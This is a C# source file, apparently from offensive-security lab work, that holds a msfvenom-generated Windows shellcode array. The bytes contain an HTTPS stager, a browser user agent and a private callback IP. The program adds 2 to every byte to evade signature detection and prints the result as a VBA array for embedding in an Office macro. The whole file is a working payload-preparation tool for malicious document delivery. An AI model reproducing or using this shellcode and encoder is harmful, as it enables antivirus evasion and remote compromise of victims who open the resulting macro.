using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Text;

namespace Helper
{
    static class Program
    {
        /// <summary>
        /// 应用程序的主入口点。
        /// </summary>
        [STAThread]
        static void Main()
        {
            // 原始 msfvenom 生成的数组
            byte[] buf = new byte[] {
               252,232,143,0,0,0,96,49,210,137,229,100,139,82,48,139,82,12,139,82,20,139,114,40,15,183,74,38,49,255,49,192,172,60,97,124,2,44,32,193,207,13,1,199,73,117,239,82,139,82,16,87,139,66,60,1,208,139,64,120,133,192,116,76,1,208,139,88,32,80,1,211,139,72,24,133,201,116,60,49,255,
73,139,52,139,1,214,49,192,172,193,207,13,1,199,56,224,117,244,3,125,248,59,125,36,117,224,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18,233,128,255,255,255,93,104,110,101,116,0,104,119,105,110,105,84,
104,76,119,38,7,255,213,49,219,83,83,83,83,83,232,81,0,0,0,77,111,122,105,108,108,97,47,53,46,48,32,40,87,105,110,100,111,119,115,32,78,84,32,49,48,46,48,59,32,87,105,110,54,52,59,32,120,54,52,59,32,114,118,58,49,50,52,46,48,41,32,71,101,99,107,111,47,50,48,49,
48,48,49,48,49,32,70,105,114,101,102,111,120,47,49,50,52,46,48,0,104,58,86,121,167,255,213,83,83,106,3,83,83,104,187,1,0,0,232,230,0,0,0,47,89,70,98,50,50,85,66,65,85,72,56,78,45,119,122,54,97,119,105,84,100,81,95,87,100,78,57,119,122,72,104,48,115,49,69,112,
115,116,67,81,85,80,99,111,102,107,53,120,114,111,108,72,53,122,85,87,57,81,85,104,98,88,75,87,76,79,73,72,101,97,99,107,110,111,71,109,86,101,68,114,106,115,54,83,104,0,80,104,87,137,159,198,255,213,137,198,83,104,0,50,232,132,83,83,83,87,83,86,104,235,85,46,59,255,213,150,
106,10,95,104,128,51,0,0,137,224,106,4,80,106,31,86,104,117,70,158,134,255,213,83,83,83,83,86,104,45,6,24,123,255,213,133,192,117,20,104,136,19,0,0,104,68,240,53,224,255,213,79,117,205,232,75,0,0,0,106,64,104,0,16,0,0,104,0,0,64,0,83,104,88,164,83,229,255,213,147,
83,83,137,231,87,104,0,32,0,0,83,86,104,18,150,137,226,255,213,133,192,116,207,139,7,1,195,133,192,117,229,88,195,95,232,107,255,255,255,49,57,50,46,49,54,56,46,52,53,46,50,49,56,0,187,224,29,42,10,104,166,149,189,157,255,213,60,6,124,10,128,251,224,117,5,187,71,19,114,111,
106,0,83,255,213 // ... 从 msfvenom 生成并导入完整的数组
            };

            // 对数组进行编码操作（例如加 2）
            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
            }

            // 构建 VBA 兼容的输出格式
            uint counter = 0;
            StringBuilder vbaFormatted = new StringBuilder(encoded.Length * 4);
            vbaFormatted.Append("buf = Array(");

            foreach (byte b in encoded)
            {
                vbaFormatted.AppendFormat("{0}, ", b); // 使用十进制值
                counter++;
                if (counter % 50 == 0)
                {
                    vbaFormatted.AppendFormat("_{0}", Environment.NewLine); // 换行保持可读性
                }
            }

            // 移除末尾的逗号和空格，并补上括号
            if (vbaFormatted.Length > 2)
            {
                vbaFormatted.Length -= 2; // 去掉最后的 ", "
            }
            vbaFormatted.Append(")");

            // 输出最终格式的 shellcode
            Console.WriteLine("The VBA formatted payload is: " + vbaFormatted.ToString());

            // 启动 Windows Forms 应用程序
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            
        }
    }
}
